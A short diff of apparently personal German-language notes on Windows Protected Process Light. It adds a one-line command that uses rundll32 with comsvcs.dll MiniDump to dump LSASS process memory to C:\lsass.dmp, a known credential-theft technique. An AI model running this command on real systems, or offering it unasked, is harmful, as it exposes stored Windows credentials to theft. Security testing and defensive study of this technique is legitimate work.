@@ -1,5 +1,9 @@
+PPL
+
 Get-ProcessMitigation -Id <PID> | Select-Object -ExpandProperty Protection
 
+#Erstellt LSSAS Dump
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 
 
 Decode-Tabelle: Welche Werte bedeuten was?
